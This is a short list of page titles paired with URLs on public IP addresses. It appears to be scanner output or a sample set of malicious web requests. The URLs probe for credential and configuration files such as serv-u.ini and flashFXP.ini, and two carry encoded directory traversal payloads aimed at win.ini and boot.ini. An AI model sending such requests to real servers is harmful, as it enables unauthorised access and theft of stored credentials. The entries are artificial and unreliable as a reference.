Server Administration - Connection Status,http://31.220.45.118:8080/pm/preferences.ini
Admin - Connection Status,http://31.220.45.118/login1/modules/AllMyGuests/cgi-bin/netscape.ini
Uploader - V.Networks [Top],http://103.106.74.51/login-us/axis-cgi/flashFXP.ini
liveapplet,http://175.96.14.175/login1/servlet/wwwroot/ventrilo_srv.ini
Joomla - Web Installer,http://203.187.87.186/comments/doscar.ru/rabota/vakansii/phpSysInfo/perl/newsletter/perform.ini
Usage,http://175.96.15.186/login/:2082/suse/netscape.ini
Ultraboard - Password,http://210.242.149.153/comments/wamp_dir/setup/serv-u.ini
Novell Web Services - Password,http://210.242.149.153/login/enc/.r%257B%257D_vti_cnf/flashFXP.ini
"\""PHP",http://203.105.230.152/login/ovcgi/1220/wwwroot/preferences.ini
Apache::Status,http://210.63.253.164/login1/advSearch_h.asp/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
"\""web - My Resource",http://210.63.253.163/comments/log/magmi/..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cboot.ini
